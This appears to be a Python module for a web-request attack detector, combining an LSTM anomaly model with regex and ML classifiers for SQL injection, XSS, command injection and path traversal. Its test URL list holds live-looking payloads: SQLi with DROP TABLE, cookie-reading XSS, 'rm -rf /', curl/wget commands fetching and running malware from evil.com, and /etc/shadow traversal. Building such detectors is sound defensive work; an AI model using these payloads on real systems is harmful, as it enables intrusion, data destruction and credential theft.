from __future__ import print_function
from sklearn.feature_extraction.text import CountVectorizer
from urllib.parse import urlparse, unquote
from store import SQL_KEYWORDS, SQL_REGEX ,UNIX_ALIASES,PATH_TRAVERSAL_REGEX
import re
import pickle
import numpy as np
import string
import json
from urllib.parse import urlparse, parse_qs
import os
os.environ['TF_CPP_MIN_LOG_LEVEL'] = '3'
import tensorflow as tf

# laoding main  model of detection
CURRENT_DIR = os.path.dirname(os.path.dirname(__file__))
MODEL_PATH = os.path.join(CURRENT_DIR, 'models', 'lstm_final.h5')
MODEL = tf.keras.models.load_model(MODEL_PATH)
CONFIG = MODEL.get_config()
LENGTH = CONFIG["layers"][0]["config"]["batch_input_shape"][1]


class AnomalyDetect():
    def __init__(self):
        pass

    def string_to_index(self, str_request, dictionary):
        index_request = np.zeros(len(str_request))
        for i in range(len(str_request)):
            try:
                index_request[i] = dictionary[str_request[i]]
            except KeyError:
                pass
        return tf.convert_to_tensor(index_request, dtype=tf.int32)

    def create_dict(self):
        dictionary = {}
        alphabet = string.ascii_lowercase+string.digits+string.punctuation+' '
        for i in range(len(alphabet)):
            dictionary[alphabet[i]] = i
        return dictionary

    def predict(self, payload):
        # loading model
        dictionary = self.create_dict()
        payload = self.string_to_index(payload, dictionary)
        data = [payload]
        data = tf.keras.preprocessing.sequence.pad_sequences(
            data, padding='post', maxlen=LENGTH)
        return MODEL.predict(data).round()[0] == 1

class SQLIDetect():

    def __init__(self):
        pass
    # detection of SQL injection using pattern matching
    # payload: the statement to be checked
    # The function returns True if the statement is a SQL injection, False otherwise

    def Regex_detect(self, payload):
        if payload.strip() == "":
            return False

        for pattern in SQL_REGEX:
            if re.search(pattern, payload, flags=re.IGNORECASE | re.UNICODE):
                return True
        return False
    # detection of SQL injection using machine learning

    def ML_detect(self, payload):
        with open('../models/sqli_model.pkl', 'rb') as f:
            model, vectorizer = pickle.load(f)
        data = vectorizer.transform([payload])
        return model.predict(data).round()[0] == 1
    # this function checks if the patterns are valid

    def check_patterns(self):
        for pattern in SQL_REGEX:
            if not re.compile(pattern):
                return False
        return True

class XSSDetect():
    def __init__(self):
        pass
    # detection of XSS using Machine Learning

    def ML_detect(self, payload):
        with open('../models/xss_model.pkl', 'rb') as f:
            model, vectorizer = pickle.load(f)
        data = vectorizer.transform([payload])
        return model.predict(data).round()[0] == 1

class CMDiDetect():
    def __init__(self):
        pass
    # detection of Command injection
    def Detect(self, payload):
        if payload.strip() == "":
            return False

        escaped_aliases = [re.escape(alias) for alias in UNIX_ALIASES]
        cmdi_regex = r".*(;|\||&&|\n)( |)(" + "|".join(escaped_aliases) + ").*$"

        if re.search(cmdi_regex, payload, flags=re.IGNORECASE | re.UNICODE):
            return True
        return False



def isAnomalous(payload):
    anomalyDetect = AnomalyDetect()
    return anomalyDetect.predict(payload)


def getAttackType(payload):
    sqli = SQLIDetect()
    xss = XSSDetect()
    cmdi = CMDiDetect()
    
    if cmdi.Detect(payload):
        return "CMDi"
    elif xss.ML_detect(payload):
        return "XSS"
    elif re.search(PATH_TRAVERSAL_REGEX, payload, flags=re.IGNORECASE | re.UNICODE):
        return "PATH TRAVEL"
    elif sqli.ML_detect(payload):
        return "SQLi"
    else:
        return "Suspicious"

urls = urls = [
    # SQL Injection
    "/search.php?q=test'",
    "/index.php?id=1'",
    "/product.php?id=1'",
    "/category.php?id=1'",
    "/news.php?id=1'",
    "/blog.php?id=1'",
    "/faq.php?id=1'",
    "/view.php?id=1'",
    "/login.php?username=admin' OR 1=1 --",
    "/search.php?q=test'; DROP TABLE users; --",
    "/index.php?id=1 UNION SELECT 1,2,3,4,5 ;--",
    "/product.php?id=1; UPDATE products SET price=0 WHERE id=1; --",
    "/category.php?id=1 AND (SELECT COUNT(*) FROM users)=0;--",

    # Cross-Site Scripting
    "/search.php?q=<script>alert('XSS')</script>",
    "/index.php?id=<script>alert('XSS')</script>",
    "/product.php?id=<script>alert('XSS')</script>",
    "/category.php?id=<script>alert('XSS')</script>",
    "/news.php?id=<script>alert('XSS')</script>",
    "/blog.php?id=<script>alert('XSS')</script>",
    "/faq.php?id=<script>alert('XSS')</script>",
    "/view.php?id=<script>alert('XSS')</script>",
    "/login.php?username=<script>alert('XSS')</script>",
    "/search.php?q=<img src='x' onerror='alert(document.cookie)'/>",

    # Command Injection
    "/search.php?q=test; ping 127.0.0.1",
    "/index.php?id=1; ls -la",
    "/product.php?id=1; cat /etc/passwd",
    "/category.php?id=1; rm -rf /",
    "/news.php?id=1; net user",
    "/blog.php?id=1; whoami",
    "/faq.php?id=1; curl http://evil.com/malware.exe | bash",
    "/view.php?id=1; wget http://evil.com/malware.exe -O /tmp/malware.exe && chmod +x /tmp/malware.exe && /tmp/malware.exe",
    "/login.php?username=admin' OR 1=1; net user",
    "/search.php?ip=ping%20-c%204%208.8.8.8;id&Submit=Submit",
    
    # Path Traversal
    "/download.php?file=../../../etc/passwd",
    "/view.php?file=../../../../etc/passwd",
    "/read.php?file=..%2f..%2f..%2fetc%2fpasswd",
    "/file.php?name=../../etc/passwd",
    "/download.php?file=..%2f..%2f..%2fetc%2fshadow",
    "/view.php?file=../../../etc/shadow",
    "/read.php?file=..%2f..%2f..%2fetc%2fshadow",
    "/file.php?name=../../etc/shadow",
]

""" with open("file.txt","w") as f:

    for payload in urls:
        f.write(payload + "\n")
        if isAnomalous(payload):
            f.write(f"attack type:{getAttackType(payload)}")
        else:
            f.write("No anomaly detected")
        f.write("\n")
        f.write("-"*100)
        f.write("\n")
 """
cmdi=CMDiDetect()

print(cmdi.Detect("http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1%27+OR+1%3D1+UNION+SELECT+1%2CDATABASE%28%29+%23&Submit=Submit&user_token=8e64522b6a10366a9c8380b896225236"))